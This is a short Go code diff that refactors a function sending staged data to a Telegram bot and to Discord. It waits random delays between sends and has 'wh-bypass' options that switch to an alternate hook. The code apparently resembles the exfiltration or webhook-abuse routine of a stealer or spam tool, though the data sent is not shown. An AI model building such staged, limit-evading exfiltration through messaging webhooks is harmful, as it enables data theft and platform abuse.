@@ -51,7 +51,7 @@ func attempt(mirror string) {
 	reset()
 
 	if m.Token != "" && m.Chat != "" {
-		m.SendToTelegram(&h, d.DataForStep(0, nil).Content)
+		m.SendToTelegram(d.DataForStep(0, nil).Content)
 		common.RandDelayRange(10*time.Second, 30*time.Second)
 	}
 
@@ -59,7 +59,7 @@ func attempt(mirror string) {
 	if m.HasOption("alt1") {
 		op["wrap"] = "😎😎"
 	}
-	m.SendDiscord(&h, d.DataForStep(1, op))
+	m.SendDiscord(d.DataForStep(1, op))
 	reset()
 	common.RandDelayRange(10*time.Second, 30*time.Second)
 
@@ -74,7 +74,7 @@ func attempt(mirror string) {
 	if m.HasOption("alt2") {
 		op["alt2"] = ""
 	}
-	m.SendDiscord(&h, d.DataForStep(2, op))
+	m.SendDiscord(d.DataForStep(2, op))
 	reset()
 	common.RandDelayRange(15*time.Second, 30*time.Second)
 
@@ -95,7 +95,7 @@ func attempt(mirror string) {
 	if m.HasOption("wh-bypass-3") {
 		alt_hook()
 	}
-	m.SendDiscord(&h, d.DataForStep(3, op))
+	m.SendDiscord(d.DataForStep(3, op))
 	reset()
 	common.RandDelayRange(15*time.Second, 30*time.Second)
 
@@ -107,7 +107,7 @@ func attempt(mirror string) {
 	if m.HasOption("wh-bypass-4") {
 		alt_hook()
 	}
-	m.SendDiscord(&h, d.DataForStep(4, op))
+	m.SendDiscord(d.DataForStep(4, op))
 	reset()
 	common.RandDelayRange(35*time.Second, 50*time.Second)
 
@@ -119,7 +119,7 @@ func attempt(mirror string) {
 	if m.HasOption("wh-bypass-5") {
 		alt_hook()
 	}
-	m.SendDiscord(&h, d.DataForStep(5, op))
+	m.SendDiscord(d.DataForStep(5, op))
 	reset()
 	common.RandDelayRange(35*time.Second, 50*time.Second)
 }
